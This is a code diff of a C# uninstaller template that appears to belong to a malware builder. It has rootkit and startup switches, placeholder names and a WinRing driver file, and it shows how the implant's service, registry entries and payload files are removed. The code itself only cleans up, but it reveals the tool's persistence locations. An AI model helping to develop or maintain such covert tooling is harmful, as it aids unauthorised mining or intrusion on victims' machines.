@@ -17,8 +17,6 @@ using System.Linq;
 
 public partial class _rUninstaller_
 {
-    private static string libsPath = Path.Combine(Environment.GetFolderPath($CSLIBSROOT), "Google\\Libs\\");
-
     private static void Main()
     {
 #if DefRootkit
@@ -38,25 +36,21 @@ public partial class _rUninstaller_
 #if DefStartup
         try
         {
-            Command("cmd", "/c reg delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"#STARTUPENTRYNAME\" /f");
+            Command("cmd", "/c sc delete \"#STARTUPENTRYNAME\" & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#STARTUPENTRYNAME\" /f");
 
         }
         catch {}
-
-        try
-        {
-            Command("cmd", "/c schtasks /delete /f /tn \"#STARTUPENTRYNAME\"");
-        }
-        catch { }
 #endif
 
         Thread.Sleep(3000);
         try
         {
-            Directory.Delete(libsPath, true);
 #if DefStartup
-            File.Delete(PayloadPath);
+            File.Delete(PayloadAdminPath);
+            File.Delete(PayloadUserPath);
 #endif
+            File.Delete(Path.Combine(Path.GetTempPath(), "#WINRINGNAME"));
+            File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Temp", "#WINRINGNAME"));
         }
         catch { }
 
